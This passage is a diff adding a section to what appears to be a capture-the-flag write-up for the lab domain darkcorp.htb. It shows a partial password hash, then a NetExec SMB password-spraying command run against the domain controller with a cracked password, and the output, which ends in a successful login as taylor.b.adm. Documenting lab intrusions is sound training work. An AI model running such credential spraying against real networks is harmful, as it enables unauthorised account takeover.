@@ -1330,7 +1330,28 @@ $6$5wwc6mW6nrcRD4Uu$9rigmpKLyqH/.hQ520PzqN2/6u6PZpQQ93ESam/OHvlnQKQppk6DrNjL6ruz
 
 This hash cracked
 
-# 
+# Compromising `talyor.b.adm`
+
+```python
+nxc smb dc-01.darkcorp.htb -u users.txt -p '!QAZzaq1' --continue-on-success            
+SMB         172.16.20.1     445    DC-01            [*] Windows Server 2022 Build 20348 x64 (name:DC-01) (domain:darkcorp.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         172.16.20.1     445    DC-01            [-] darkcorp.htb\Administrator:!QAZzaq1 STATUS_LOGON_FAILURE 
+SMB         172.16.20.1     445    DC-01            [-] darkcorp.htb\Guest:!QAZzaq1 STATUS_LOGON_FAILURE 
+SMB         172.16.20.1     445    DC-01            [-] darkcorp.htb\krbtgt:!QAZzaq1 STATUS_LOGON_FAILURE 
+SMB         172.16.20.1     445    DC-01            [-] darkcorp.htb\DC-01$:!QAZzaq1 STATUS_LOGON_FAILURE 
+SMB         172.16.20.1     445    DC-01            [-] darkcorp.htb\victor.r:!QAZzaq1 STATUS_LOGON_FAILURE 
+SMB         172.16.20.1     445    DC-01            [-] darkcorp.htb\svc_acc:!QAZzaq1 STATUS_LOGON_FAILURE 
+SMB         172.16.20.1     445    DC-01            [-] darkcorp.htb\john.w:!QAZzaq1 STATUS_LOGON_FAILURE 
+SMB         172.16.20.1     445    DC-01            [-] darkcorp.htb\angela.w:!QAZzaq1 STATUS_LOGON_FAILURE 
+SMB         172.16.20.1     445    DC-01            [-] darkcorp.htb\angela.w.adm:!QAZzaq1 STATUS_LOGON_FAILURE 
+SMB         172.16.20.1     445    DC-01            [-] darkcorp.htb\taylor.b:!QAZzaq1 STATUS_LOGON_FAILURE 
+SMB         172.16.20.1     445    DC-01            [-] darkcorp.htb\DRIP$:!QAZzaq1 STATUS_LOGON_FAILURE 
+SMB         172.16.20.1     445    DC-01            [+] darkcorp.htb\taylor.b.adm:!QAZzaq1
+```
+
+I have compromised the user `taylor.b.adm`
+
+
 
 
 
